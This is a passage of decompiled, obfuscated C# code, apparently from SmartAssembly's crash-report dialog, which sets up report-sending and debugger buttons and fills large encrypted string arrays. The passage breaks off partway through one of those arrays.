        __Boxed<SendingReportStep> o2 = (System.Enum) step;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) num2;
        object o6 = Ⴗ;
        SendingReportFeedbackEventArgs o7 = Ⴄ;
        StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this, o6, (object) o7);
        throw;
      }
    }

    private void Ⴜ(object Ⴐ, EventArgs Ⴍ)
    {
      try
      {
        WaitSendingReportControl.ႥႷ((Form) this, 898, 951);
      }
      catch (Exception ex)
      {
        object o2 = Ⴐ;
        EventArgs o3 = Ⴍ;
        StackFrameHelper.CreateException3(ex, (object) this, o2, (object) o3);
        throw;
      }
    }

    private void ႰႤ(object Ⴀ, EventArgs Ⴓ)
    {
      int num;
      bool flag;
      try
      {
        num = 4;
        while (true)
        {
          switch (num)
          {
            case 0:
              this.Ⴜ.ႥႰ.Init();
              this.Ⴜ.ႥႨ.Init();
              num = 3;
              continue;
            case 1:
              goto label_8;
            case 2:
              num = 0;
              continue;
            case 3:
              this.Ⴜ.ႥႷ.Init();
              num = this.Ⴜ.Ⴃ == null ? 1 : 7;
              continue;
            case 5:
              goto label_10;
            case 6:
              DoNotPruneTypeAttribute.Ⴍ((Control) this.Ⴜ.ႥႭ, false, 803, 863);
              goto case 2;
            case 7:
              goto label_7;
            default:
              flag = true;
              this.Ⴜ.ႰႨ = flag;
              goto case 6;
          }
        }
label_8:
        return;
label_10:
        return;
label_7:
        this.Ⴀ(new ThreadStart(this.Ⴍ));
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<bool> o1 = (ValueType) flag;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num;
        object o4 = Ⴀ;
        EventArgs o5 = Ⴓ;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) this, o4, (object) o5);
        throw;
      }
    }

    private void Ⴍ()
    {
      try
      {
        this.Ⴜ.Ⴃ.SendReport();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    private void ႰႰ(object Ⴗ, EventArgs Ⴍ)
    {
      int num;
      try
      {
        num = 2;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 4:
            case 5:
              goto label_3;
            case 3:
              goto label_4;
            default:
              num = this.Ⴜ.Ⴃ == null ? 3 : 4;
              continue;
          }
        }
label_4:
        return;
label_3:
        this.Ⴀ(new ThreadStart(this.Ⴜ.Ⴃ.LaunchDebugger));
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num;
        object o3 = Ⴗ;
        EventArgs o4 = Ⴍ;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) this, o3, (object) o4);
        throw;
      }
    }

    public ႷႭ(UnhandledExceptionHandler Ⴄ, ReportExceptionEventArgs Ⴐ)
    {
      CheckBox checkBox = new CheckBox();
      this.Ⴜ.Ⴐ = checkBox;
      Label label1 = new Label();
      this.Ⴜ.Ⴈ = label1;
      Button button1 = new Button();
      this.Ⴜ.Ⴗ = button1;
      Button button2 = new Button();
      this.Ⴜ.Ⴄ = button2;
      Label label2 = new Label();
      this.Ⴜ.Ⴀ = label2;
      AutoHeightLabel autoHeightLabel = new AutoHeightLabel();
      this.Ⴜ.Ⴍ = autoHeightLabel;
      Panel panel1 = new Panel();
      this.Ⴜ.Ⴓ = panel1;
      Panel panel2 = new Panel();
      this.Ⴜ.Ⴜ = panel2;
      Button button3 = new Button();
      this.Ⴜ.ႥႣ = button3;
      WaitSendingReportControl sendingReportControl = new WaitSendingReportControl();
      this.Ⴜ.ႥႥ = sendingReportControl;
      FeedbackControl feedbackControl1 = new FeedbackControl(ႷႭ.ႥႳ(1491048464, 8));
      this.Ⴜ.ႥႰ = feedbackControl1;
      FeedbackControl feedbackControl2 = new FeedbackControl(MyComputer.Ⴗ(834543439, 8));
      this.Ⴜ.ႥႨ = feedbackControl2;
      FeedbackControl feedbackControl3 = new FeedbackControl(SimpleZip.Ⴓ(661403305, 7));
      this.Ⴜ.ႥႷ = feedbackControl3;
      FeedbackControl feedbackControl4 = new FeedbackControl(ႷႭ.ႥႳ(1491048504, 2));
      this.Ⴜ.ႥႤ = feedbackControl4;
      Button button4 = new Button();
      this.Ⴜ.ႥႠ = button4;
      Button button5 = new Button();
      this.Ⴜ.ႥႭ = button5;
      Button button6 = new Button();
      this.Ⴜ.ႥႳ = button6;
      HeaderControl headerControl1 = new HeaderControl(SmartAssembly.SmartExceptionsCore.DoNotPruneAttribute.Ⴃ(ႳႷ.Ⴗ(2059790902, 2), (object) ႳႷ.Ⴗ(2059790404, 4), 87, 5));
      this.Ⴜ.ႥႼ = headerControl1;
      HeaderControl headerControl2 = new HeaderControl(Ⴈ.Ⴀ.Ⴜ(ႷႭ.ႥႭ(490612942, 7), (object) ႳႷ.Ⴗ(2059790406, 6), (object) Ⴈ.Ⴀ.Ⴐ(1468303776, 6), 660, 735));
      this.Ⴜ.ႰႣ = headerControl2;
      PoweredBy poweredBy = new PoweredBy();
      this.Ⴜ.ႰႥ = poweredBy;
      Button button7 = new Button();
      this.Ⴜ.ႰႰ = button7;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      int num;
      ReportExceptionEventArgs exceptionEventArgs;
      try
      {
        this.Ⴗ();
        num = ႷႼ.Ⴐ((Control) this, 502, 429);
        exceptionEventArgs = Ⴐ;
        this.Ⴜ.Ⴃ = exceptionEventArgs;
        SmartAssembly.License.License.Ⴅ((Control) this.Ⴜ.Ⴍ, UsageReportSender.Ⴃ(Ⴐ.Exception, 766, 706), 263, 336);
        num += SimpleZip.ႤႨ.Ⴍ((Control) this.Ⴜ.Ⴍ, 407, 450) - this.FontHeight;
        if (!Ⴐ.ShowContinueCheckbox)
        {
          DoNotPruneTypeAttribute.Ⴍ((Control) this.Ⴜ.Ⴐ, false, 539, 615);
          num -= SimpleZip.ႤႨ.Ⴍ((Control) this.Ⴜ.Ⴐ, 280, 333);
        }
        if (num > ႷႼ.Ⴐ((Control) this, 870, 829))
          Ⴈ.Ⴓ.Ⴀ((Control) this, num, 88, 23);
        if (Ⴐ.CanDebug)
        {
          Ⴄ.DebuggerLaunched += new EventHandler(this.Ⴓ);
          DoNotPruneTypeAttribute.Ⴍ((Control) this.Ⴜ.ႰႰ, true, 724, 680);
          if (ႷႠ.Ⴃ((Control) this.Ⴜ.ႰႰ, 865, 806) < this.Ⴜ.ႰႥ.Right)
            this.Ⴜ.ႰႥ.Visible = false;
        }
        if (!Ⴐ.CanSendReport)
        {
          this.Ⴜ.Ⴄ.Enabled = false;
          if (this.Ⴜ.Ⴗ.CanFocus)
            this.Ⴜ.Ⴗ.Focus();
        }
        Ⴄ.SendingReportFeedback += new SendingReportFeedbackEventHandler(this.Ⴀ);
      }
      catch (Exception ex)
      {
        object[] objects = new object[26]
        {
          (object) num,
          (object) checkBox,
          (object) label1,
          (object) button1,
          (object) button2,
          (object) label2,
          (object) autoHeightLabel,
          (object) panel1,
          (object) panel2,
          (object) button3,
          (object) sendingReportControl,
          (object) feedbackControl1,
          (object) feedbackControl2,
          (object) feedbackControl3,
          (object) feedbackControl4,
          (object) button4,
          (object) button5,
          (object) button6,
          (object) headerControl1,
          (object) headerControl2,
          (object) poweredBy,
          (object) button7,
          (object) exceptionEventArgs,
          (object) this,
          (object) Ⴄ,
          (object) Ⴐ
        };
        StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    static ႷႭ()
    {
      int num;
      char[] chArray1;
      char[] chArray2;
      try
      {
        num = 0;
        while (true)
        {
          switch (num)
          {
            case 1:
              chArray1[5] = 'ԣ';
              goto case 5;
            case 2:
              chArray1[0] = 'ሀ';
              chArray1[2] = 'ዯ';
              num = 1;
              continue;
            case 3:
              chArray1[7] = 'ᓘ';
              goto case 2;
            case 4:
              chArray1[4] = 'ም';
              chArray1[1] = '㳂';
              chArray1[3] = '㍘';
              num = 3;
              continue;
            case 5:
              chArray1[6] = 'ٔ';
              ႷႭ.ႥႼ = new string[47];
              num = 10;
              continue;
            case 6:
              chArray2[5] = 'ԣ';
              chArray2[0] = 'ሀ';
              chArray2[1] = '㳂';
              num = 8;
              continue;
            case 7:
              goto label_12;
            case 8:
              chArray2[6] = 'ٔ';
              chArray2[7] = 'ᓘ';
              chArray2[2] = 'ዯ';
              num = 11;
              continue;
            case 10:
              ႷႭ.ႥႠ = chArray1;
              ႷႭ.ႥႰ = new char[1213]
              {
                char.MinValue,
                '\t',
                char.MinValue,
                'ቓ',
                '㲭',
                '\u1289',
                '㌬',
                'ቪ',
                'Ղ',
                'ئ',
                'ᒽ',
                'ቜ',
                '\u0001',
                '\u001C',
                char.MinValue,
                '㲉',
                'ኋ',
                '㌮',
                'ቓ',
                'Ս',
                'ز',
                'ᒎ',
                'ቆ',
                '㳺',
                '\u12BF',
                '㍡',
                'ሩ',
                'Յ',
                '؎',
                'ᓪ',
                'ቈ',
                '㲇',
                'ኝ',
                '㌂',
                'ቺ',
                'Փ',
                '٣',
                'ᒏ',
                'ቘ',
                '㲭',
                'ኇ',
                '㌋',
                'ቯ',
                '\u0002',
                '$',
                char.MinValue,
                '\u1289',
                '㌾',
                'ቍ',
                'Ԗ',
                'س',
                'ᓷ',
                '\u1259',
                '㲛',
                'ን',
                '㌗',
                'ቭ',
                'բ',
                'ؙ',
                'ᓯ',
                'ቡ',
                '㲒',
                'ካ',
                '㌷',
                'ቋ',
                'ԕ',
                '٠',
                'ᒭ',
                'ቱ',
                '㲥',
                'ዀ',
                '㌐',
                'ቕ',
                'Ս',
                'ٻ',
                'ᒏ',
                'ቅ',
                '㳲',
                'ኛ',
                '㌑',
                'ቜ',
                'Ԟ',
                '\u0003',
                '\t',
                char.MinValue,
                '㌍',
                'ቮ',
                'Ԓ',
                '؍',
                'ᒾ',
                'ሹ',
                '㲱',
                'ኔ',
                '㌔',
                '\u0004',
                '\u001C',
                char.MinValue,
                'ቸ',
                'լ',
                'ؘ',
                'ᒮ',
                'ቧ',
                '㲤',
                'ዖ',
                '㌗',
                'ቮ',
                'Ղ',
                'أ',
                'ᒮ',
                'ቄ',
                '㳵',
                'ዙ',
                '㌼',
                '\u125E',
                'Ԕ',
                '١',
                'ᓪ',
                'ሰ',
                '㳭',
                'ኸ',
                '㌼',
                'ሲ',
                'ԓ',
                '\u0604',
                'ᒵ',
                '\u0005',
                '\t',
                char.MinValue,
                'ԕ',
                'ٺ',
                'ᓯ',
                'ሮ',
                '㳲',
                '\u12C1',
                '㍩',
                'ር',
                'Ԑ',
                '\u0006',
                '\u0004',
                char.MinValue,
                '\u0604',
                'ᒹ',
                'ቴ',
                '㲪',
                '\a',
                '\u001E',
                char.MinValue,
                'ᒋ',
                'ቯ',
                '㲤',
                'ኛ',
                '㌯',
                'ቼ',
                'Ց',
                'ر',
                'ᒄ',
                '\u1257',
                '㲭',
                'ኘ',
                '㍮',
                'ሩ',
                'Ԑ',
                '٦',
                'ᒖ',
                'ቯ',
                '㲦',
                'ኊ',
                '㌄',
                '\u124F',
                'Ն',
                'ذ',
                'ᓸ',
                'ቇ',
                '㲣',
                'ኛ',
                '㌽',
                'ቁ',
                '\b',
                '\t',
                char.MinValue,
                'ሶ',
                '㳬',
                'ዘ',
                '㍶',
                'ር',
                'ԍ',
                '٦',
                'ᓫ',
                'ሹ',
                '\t',
                '!',
                char.MinValue,
                '㲯',
                'ኰ',
                '㌜',
                'ቲ',
                'խ',
                'ػ',
                'ᒬ',
                'ቓ',
                '㲧',
                'ኁ',
                '㌼',
                'ቛ',
                'Ն',
                'ص',
                'ᒬ',
                'ት',
                '㲰',
                'ኊ',
                '㌍',
                'ቮ',
                'Ղ',
                'س',
                'ᒽ',
                'ቒ',
                '㲧',
                'ኟ',
                '㌷',
                'ቯ',
                '\u0557',
                'ا',
                'ᒚ',
                'ቴ',
                '㲬',
                '\n',
                '5',
                char.MinValue,
                'ኼ',
                '㌡',
                'ቮ',
                '\u0557',
                'ر',
                'ᒵ',
                'ሮ',
                '㲑',
                'ኊ',
                '㌻',
                'ቨ',
                'Ց',
                'ؽ',
                'ᒬ',
                'ቹ',
                '㳬',
                'ኬ',
                '㌪',
                'ቤ',
                'Փ',
                'ؠ',
                'ᒷ',
                'ቧ',
                '㲰',
                '\u128E',
                '㌨',
                'ት',
                '՚',
                'ٺ',
                'ᒜ',
                'ቅ',
                '㲑',
                'ኬ',
                '㌪',
                'ቤ',
                'Փ',
                'ؠ',
                'ᒷ',
                'ቓ',
                '㲧',
                'ኝ',
                '㌮',
                'ቴ',
                'Հ',
                'ر',
                'ᒈ',
                'ቲ',
                '㲭',
                'ኙ',
                '㌱',
                'ቹ',
                'Ն',
                'ئ',
                '\v',
                '\u0003',
                char.MinValue,
                '㌓',
                'ቸ',
                '՚',
                '\f',
                '\u000E',
                char.MinValue,
                'ቈ',
                'Ս',
                'ؿ',
                'ᒶ',
                'ቯ',
                '㲵',
                'ኁ',
                '㍸',
                'ቕ',
                'Ն',
                'ص',
                'ᒼ',
                'ብ',
                '㲰',
                '\r',
                '\u0001',
                char.MinValue,
                '\u0558',
                '\u000E',
                'C',
                char.MinValue,
                'ؑ',
                'ᒊ',
                'ቒ',
                '㳢',
                'ዝ',
                '㍨',
                'ር',
                'ԕ',
                'ٮ',
                'ᓸ',
                'ቔ',
                '㲪',
                'ኆ',
                '㌫',
                'ሽ',
                '\u0557',
                'ر',
                'ᒵ',
                'ተ',
                '㲮',
                '\u128E',
                '㌬',
                'ቸ',
                'ԃ',
                'أ',
                'ᒹ',
                'ታ',
                '㳢',
                'ኁ',
                '㌷',
                'ቩ',
                'ԃ',
                'ؤ',
                'ᒪ',
                'ቯ',
                '㲲',
                'ኊ',
                '㌪',
                'ቱ',
                '՚',
                'ٴ',
                'ᒨ',
                'ቲ',
                '㲭',
                'ኌ',
                '㌽',
                'ቮ',
                'Ր',
                'ر',
                'ᒼ',
                'ሠ',
                '㲠',
                'ኖ',
                '㍸',
                '\u124E',
                'Վ',
                'ص',
                'ᒪ',
                'ቴ',
                '㲃',
                'ኜ',
                '㌫',
                'ቸ',
                'Վ',
                'ض',
                'ᒴ',
                'ቹ',
                '\u000F',
                '\'',
                char.MinValue,
                'ᒋ',
                'ቹ',
                '㲱',
                'ኛ',
                '㌽',
                'ተ',
                'ԍ',
                '؇',
                'ᒽ',
                'ባ',
                '㲷',
                'ኝ',
                '㌱',
                'ቩ',
                '՚',
                'ٺ',
                'ᒛ',
                'ቲ',
                '㲻',
                'ኟ',
                '㌬',
                'ቲ',
                'Մ',
                'ئ',
                'ᒹ',
                'ተ',
                '㲪',
                'ኖ',
                '㍶',
                'ቜ',
                'Ն',
                'ا',
                'ᒕ',
                'ቡ',
                '㲬',
                '\u128E',
                '㌿',
                'ቸ',
                'Շ',
                '\u0010',
                '\u001B',
                char.MinValue,
                'ቕ',
                '㲬',
                'ኇ',
                '㌹',
                'ታ',
                'Շ',
                'ظ',
                'ᒽ',
                'ቤ',
                '㲇',
                'ኗ',
                '㌻',
                'ቸ',
                'Փ',
                'ؠ',
                'ᒱ',
                'ቯ',
                '㲬',
                '\u12C1',
                '㌕',
                'ቸ',
                '\u0557',
                'ؼ',
                'ᒷ',
                'ቤ',
                '㲋',
                'ካ',
                '\u0011',
                '\a',
                char.MinValue,
                '㲧',
                'ኝ',
                '㌪',
                'ቲ',
                'Ց',
                '٥',
                'ᓮ',
                '\u0012',
                '\t',
                char.MinValue,
                'ኘ',
                '㌹',
                'ቯ',
                'Ս',
                'ؽ',
                'ᒶ',
                'ቧ',
                '㳳',
                'ዙ',
                '\u0013',
                '\u0005',
                char.MinValue,
                '㌞',
                'ቴ',
                'Ն',
                'ظ',
                'ᒼ',
                '\u0014',
                '\u0006',
                char.MinValue,
                '\u124E',
                '\u0557',
                'ص',
                'ᒬ',
                'ቩ',
                '㲡',
                '\u0015',
                '\u0002',
                char.MinValue,
                'Ԅ',
                'ٴ',
                '\u0016',
                '\u0004',
                char.MinValue,
                'ٴ',
                'ᓰ',
                'ሰ',
                '㲺',
                '\u0017',
                '\u0001',
                char.MinValue,
                'ᒚ',
                '\u0018',
                '\u0003',
                char.MinValue,
                '\u124E',
                '㳭',
                'ኮ',
                '\u0019',
                '\u0010',
                char.MinValue,
                '㲁',
                'ኚ',
                '㌫',
                'ቩ',
                'Ռ',
                'ع',
                'ᒈ',
                'ቲ',
                '㲭',
                'ኟ',
                '㌽',
                'ቯ',
                '\u0557',
                'ؽ',
                'ᒽ',
                'ታ',
                '\u001A',
                '\u0006',
                char.MinValue,
                'ኣ',
                '㌽',
                'ታ',
                'Մ',
                'ؠ',
                'ᒰ',
                '\u001B',
                '\u0004',
                char.MinValue,
                '㌜',
                'ቼ',
                '\u0557',
                'ص',
                '\u001C',
                '\u0003',
                char.MinValue,
                'ቅ',
                'ԕ',
                '٠',
                '\u001D',
                '\t',
                char.MinValue,
                'լ',
                'ض',
                'ᒲ',
                'ብ',
                '㲡',
                'ኛ',
                '㌜',
                'ቸ',
                'Յ',
                '\u001E',
                '\v',
                char.MinValue,
                '\u061D',
                'ᒝ',
                'ቮ',
                '㲷',
                'ኂ',
                '㌽',
                'ቯ',
                'Ղ',
                'ض',
                'ᒴ',
                'ብ',
                '\u001F',
                '\u0006',
                char.MinValue,
                'ᒇ',
                '\u125F',
                '㲠',
                '\u128E',
                '㌫',
                'ቸ',
                ' ',
                '\a',
                char.MinValue,
                'ቍ',
                '㲧',
                'ኜ',
                '㌫',
                'ቼ',
                'Մ',
                'ر',
                '!',
                '\u0002',
                char.MinValue,
                '㳏',
                'ዥ',
                '"',
                '\u0006',
                char.MinValue,
                'ኢ',
                '㌽',
                'ቩ',
                'Ջ',
                'ػ',
                'ᒼ',
                '#',
                '\u0015',
                char.MinValue,
                '㍷',
                'ቜ',
                'Շ',
                'ذ',
                'ᒝ',
                'ቸ',
                '㲡',
                'ኊ',
                '㌨',
                'ቩ',
                'Պ',
                'ػ',
                'ᒶ',
                'ቒ',
                '㲧',
                'ኟ',
                '㌷',
                'ቯ',
                '\u0557',
                'ٴ',
                'ᓺ',
                '$',
                '\u001A',
                char.MinValue,
                '\u124E',
                '՚',
                'ا',
                'ᒬ',
                'ብ',
                '㲯',
                '\u12C1',
                '㌏',
                'ቴ',
                'Ս',
                'ذ',
                'ᒷ',
                'ቷ',
                '㲱',
                '\u12C1',
                '㌙',
                'ቭ',
                'Փ',
                'ظ',
                'ᒱ',
                'ባ',
                '㲣',
                'ኛ',
                '㌱',
                'ቲ',
                'Ս',
                '%',
                '\a',
                char.MinValue,
                'ե',
                'ر',
                'ᒹ',
                'ቴ',
                '㲷',
                'ኝ',
                '㌽',
                '&',
                '\u0002',
                char.MinValue,
                '\u061D',
                'ᒼ',
                '\'',
                '\u000F',
                char.MinValue,
                'ᒜ',
                'ቹ',
                '㲬',
                '\u128E',
                '㌵',
                'ቴ',
                'Հ',
                'ؒ',
                'ᒽ',
                'ቡ',
                '㲶',
                'ኚ',
                '㌪',
                'ቸ',
                'Ր',
                '(',
                '\a',
                char.MinValue,
                'ሦ',
                '㲁',
                '\u128E',
                '㌶',
                'ቾ',
                'Ն',
                'ظ',
                ')',
                '\u0011',
                char.MinValue,
                '㲱',
                '\u128E',
                '㌽',
                'ታ',
                'Հ',
                'ئ',
                'ᒡ',
                'ተ',
                '㲶',
                'ኊ',
                '㌼',
                'ቯ',
                'Ն',
                'ؤ',
                'ᒷ',
                'ቲ',
                '㲶',
                '*',
                '\u001B',
                char.MinValue,
                '\u12BF',
                '㌪',
                'ቸ',
                'Փ',
                'ص',
                'ᒪ',
                'ቩ',
                '㲬',
                'ኈ',
                '㍸',
                'ቩ',
                'Ջ',
                'ر',
                'ᓸ',
                'ብ',
                '㲰',
                'ኝ',
                '㌷',
                'ቯ',
                'ԃ',
                'ئ',
                'ᒽ',
                'ተ',
                '㲭',
                'ኝ',
                '㌬',
                'ሳ',
                '+',
                '%',
                char.MinValue,
                '㌝',
                'ቯ',
                'Ց',
                'ػ',
                'ᒪ',
                'ሠ',
                '㲰',
                'ኊ',
                '㌨',
                'ቲ',
                'Ց',
                'ؠ',
                'ᒱ',
                'ቮ',
                '㲥',
                'ዏ',
                '㌻',
                'ቲ',
                'Վ',
                'ؤ',
                'ᒴ',
                'ብ',
                '㲶',
                'ኊ',
                '㌼',
                'ሳ',
                'ԃ',
                '\u0600',
                'ᒰ',
                'ቡ',
                '㲬',
                'ኄ',
                '㍸',
                'ቤ',
                'Ռ',
                'ء',
                'ᓶ',
                ',',
                'Ù',
                char.MinValue,
                'ቦ',
                'ԓ',
                'ة',
                'ᓸ',
                'ቡ',
                '㲶',
                'ኛ',
                '㌽',
                'ተ',
                'Փ',
                'ؠ',
                'ᒽ',
                'ቤ',
                '㳢',
                'ኛ',
                '㌷',
                'ሽ',
                'Փ',
                'ر',
                'ᒪ',
                'ቦ',
                '㲭',
                'ኝ',
                '㌵',
                'ሽ',
                'Ղ',
                'غ',
                'ᓸ',
                'ቯ',
                '㲲',
                'ኊ',
                '㌪',
                'ቼ',
                '\u0557',
                'ؽ',
                'ᒷ',
                'ቮ',
                '㳢',
                'ኁ',
                '㌷',
                'ቩ',
                'ԃ',
                'ص',
                'ᒴ',
                'ቬ',
                '㲭',
                'ኘ',
                '㌽',
                'ቹ',
                'ԃ',
                'ض',
                'ᒡ',
                'ሠ',
                '㲶',
                'ኇ',
                '㌽',
                'ሽ',
                'Ր',
                'ر',
                'ᒻ',
                'ት',
                '㲰',
                'ኆ',
                '㌬',
                'ቤ',
                'ԃ',
                'ؤ',
                'ᒷ',
                'ቬ',
                '㲫',
                'ኌ',
                '㌡',
                'ሳ',
                'ԃ',
                '\u0600',
                'ᒷ',
                'ሠ',
                '㲥',
                'ኝ',
                '㌹',
                'ታ',
                '\u0557',
                'ٴ',
                'ᒬ',
                'ቨ',
                '㲫',
                'ኜ',
                '㍸',
                'ቼ',
                'Փ',
                'ؤ',
                'ᒴ',
                'ቩ',
                '㲡',
                '\u128E',
                '㌬',
                'ቴ',
                'Ռ',
                'غ',
                'ᓸ',
                'ቴ',
                '㲪',
                'ኊ',
                '㍸',
                'ቯ',
                'Ն',
                'إ',
                'ᒭ',
                'ቩ',
                '㲰',
                'ኊ',
                '㌼',
                'ሽ',
                'Փ',
                'ر',
                'ᒪ',
                'ቭ',
                '㲫',
                'ኜ',
                '㌫',
                'ቴ',
                'Ռ',
                'غ',
                'ᓴ',
                'ሠ',
                '㲡',
                'ኀ',
                '㌶',
                'ቩ',
                'Ղ',
                'ط',
                'ᒬ',
                'ሠ',
                '㲻',
                'ኀ',
                '㌭',
                'ቯ',
                'ԃ',
                'ا',
                'ᒡ',
                'ታ',
                '㲶',
                'ኊ',
                '㌵',
                'ሽ',
                'Ղ',
                'ذ',
                'ᒵ',
                'ቩ',
                '㲬',
                'ኆ',
                '㌫',
                'ቩ',
                'Ց',
                'ص',
                'ᒬ',
                'ቯ',
                '㲰',
                'ዃ',
                '㍸',
                'ቲ',
                'Ց',
                'ٴ',
                'ᒭ',
                'ታ',
                '㲧',
                'ዏ',
                '㌬',
                'ት',
                'Ն',
                'ٴ',
                'ᒕ',
                'ቩ',
                '㲡',
                'ኝ',
                '㌷',
                'ቮ',
                'Ռ',
                'ز',
                'ᒬ',
                'ሠ',
                '㳬',
                'ኡ',
                '㌝',
                '\u1249',
                'ԃ',
                'ؒ',
                'ᒪ',
                'ቡ',
                '㲯',
                'ኊ',
                '㌯',
                'ቲ',
                'Ց',
                'ؿ',
                'ᓸ',
                'ቃ',
                '㲭',
                'ኁ',
                '㌾',
                'ቴ',
                'Մ',
                'ء',
                'ᒪ',
                'ቡ',
                '㲶',
                'ኆ',
                '㌷',
                'ታ',
                'ԃ',
                'ؠ',
                'ᒷ',
                'ቯ',
                '㲮',
                '\u12C1',
                '㍒',
                'ሗ',
                '-',
                '\u0093',
                char.MinValue,
                'ժ',
                'ز',
                'ᓸ',
                'ቹ',
                '㲭',
                'ኚ',
                '㍸',
                'ቾ',
                'Տ',
                'ؽ',
                'ᒻ',
                'ቫ',
                '㳢',
                'ኬ',
                '㌷',
                'ታ',
                '\u0557',
                'ؽ',
                'ᒶ',
                'ት',
                '㲧',
                'ዃ',
                '㍸',
                'ቩ',
                'Ջ',
                'ر',
                'ᓸ',
                'ቡ',
                '㲲',
                'ኟ',
                '㌴',
                'ቴ',
                'Հ',
                'ص',
                'ᒬ',
                'ቩ',
                '㲭',
                'ኁ',
                '㍸',
                'ቪ',
                'Պ',
                'ظ',
                'ᒴ',
                'ሠ',
                '㲫',
                'ኈ',
                '㌶',
                'ቲ',
                'Ց',
                'ر',
                'ᓸ',
                'ቴ',
                '㲪',
                'ኆ',
                '㌫',
                'ሽ',
                'Ն',
                'ئ',
                'ᒪ',
                'ቯ',
                '㲰',
                'ዏ',
                '㌹',
                'ታ',
                'Շ',
                'ٴ',
                'ᒹ',
                'ቴ',
                '㲶',
                'ኊ',
                '㌵',
                'ቭ',
                '\u0557',
                'ٴ',
                'ᒬ',
                'ቯ',
                '㳢',
                'ኌ',
                '㌷',
                'ታ',
                '\u0557',
                'ؽ',
                'ᒶ',
                'ት',
                '㲧',
                '\u12C1',
                '㍸',
                'ቔ',
                'Յ',
                'ٴ',
                'ᒡ',
                'ቯ',
                '㲷',
                'ዏ',
                '㌻',
                'ቱ',
                'Պ',
                'ط',
                'ᒳ',
                'ሠ',
                '㲓',
                'ኚ',
                '㌱',
                'ቩ',
                'ԏ',
                'ٴ',
                'ᒬ',
                'ቨ',
                '㲧',
                'ዏ',
                '㌹',
                'ቭ',
                'Փ',
                'ظ',
                'ᒱ',
                'ባ',
                '㲣',
                'ኛ',
                '㌱',
                'ቲ',
                'Ս',
                'ٴ',
                'ᒯ',
                'ቩ',
                '㲮',
                'ኃ',
                '㍸',
                'ቾ',
                'Տ',
                'ػ',
                'ᒫ',
                'ብ',
                '㳢',
                'ኆ',
                '㌵',
                'ተ',
                'Ն',
                'ذ',
                'ᒱ',
                'ቡ',
                '㲶',
                'ኊ',
                '㌴',
                'ቤ',
                'ԍ',
                'ٞ',
                'ᓒ',
                '.',
                '\u0014',
                char.MinValue,
                'د',
                'ᓨ',
                'ች',
                '㳢',
                'ኺ',
                '㌶',
                'ቸ',
                '՛',
                'ؤ',
                'ᒽ',
                'ባ',
                '㲶',
                'ኊ',
                '㌼',
                'ሽ',
                'զ',
                'ئ',
                'ᒪ',
                'ቯ',
                '㲰',
                '/',
                '\u0014',
                char.MinValue,
                'ᒈ',
                'ቬ',
                '㲣',
                'ኛ',
                '㌾',
                'ቲ',
                'Ց',
                'ع',
                'ᓸ',
                'ቃ',
                '㲒',
                'ኺ',
                '㍸',
                '\u125E',
                'Ռ',
                'ئ',
                'ᒽ',
                'ታ',
                '㳸',
                'ዏ'
              };
              chArray2 = new char[8];
              num = 6;
              continue;
            case 11:
              chArray2[4] = 'ም';
              chArray2[3] = '㍘';
              ႷႭ.ႥႣ = new string[48];
              num = 7;
              continue;
            default:
              SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
              ႷႭ.ႥႷ = new char[1511]
              {
                char.MinValue,
                '\u0018',
                char.MinValue,
                'ቓ',
                '㲯',
                '\u128E',
                '㌪',
                'ቩ',
                'բ',
                'ا',
                'ᒫ',
                'ብ',
                '㲯',
                'ኍ',
                '㌴',
                'ቤ',
                'ձ',
                'ر',
                'ᒨ',
                'ቯ',
                '㲰',
                'ኛ',
                '㌍',
                'ቮ',
                'Ղ',
                'س',
                'ᒽ',
                '\u0001',
                '\a',
                char.MinValue,
                '㲳',
                'ኽ',
                '㌫',
                'ሺ',
                'ԓ',
                'ض',
                'ᒛ',
                '\u0002',
                '\u0010',
                char.MinValue,
                'ኻ',
                '㍳',
                '\u1249',
                'Ց',
                'ع',
                'ᓳ',
                'ቨ',
                '㲊',
                '\u12D7',
                '㌺',
                '\u125F',
                'Ք',
                '؞',
                'ᒺ',
                'ሴ',
                '㳿',
                '\u0003',
                '\b',
                char.MinValue,
                '㍲',
                'ቆ',
                'Ԓ',
                '،',
                'ᓿ',
                'ቍ',
                '㳢',
                '\u12B1',
                '\u0004',
                '$',
                char.MinValue,
                'ቸ',
                'լ',
                'ؘ',
                'ᒮ',
                'ቧ',
                '㲤',
                'ዖ',
                '㌗',
                'ቮ',
                'Ղ',
                'أ',
                'ᒮ',
                'ቇ',
                '㲰',
                'ዙ',
                '㌹',
                'ቖ',
                'Ց',
                'ؠ',
                'ᒰ',
                'ሴ',
                '㲴',
                'ኖ',
                '㌔',
                'ሯ',
                'ն',
                '٧',
                'ᒫ',
                'ሶ',
                '㲬',
                'ኮ',
                '㌴',
                'ቯ',
                'Ք',
                '٩',
                'ᓥ',
                '\u0005',
                '\u0003',
                char.MinValue,
                'Ԛ',
                'ذ',
                'ᒒ',
                '\u0006',
                '$',
                char.MinValue,
                'ر',
                'ᒗ',
                'ቌ',
                '㲴',
                'ኈ',
                '㌾',
                'ሤ',
                'լ',
                'ا',
                'ᒹ',
                'ቷ',
                '㲴',
                'ኬ',
                '㌩',
                'ተ',
                'ի',
                'ؗ',
                'ᒪ',
                'ቚ',
                '㲆',
                'ዖ',
                '㌾',
                'ቖ',
                'ծ',
                'ٻ',
                'ᓩ',
                'ቈ',
                '㲺',
                'ዟ',
                '㍫',
                'ቜ',
                'Ք',
                'ؠ',
                'ᒒ',
                'ቷ',
                '㲊',
                '\a',
                '\b',
                char.MinValue,
                'ᒽ',
                'ሰ',
                '㲣',
                'ኃ',
                '㍪',
                'ረ',
                'Շ',
                'ؼ',
                '\b',
                '\v',
                char.MinValue,
                'ቮ',
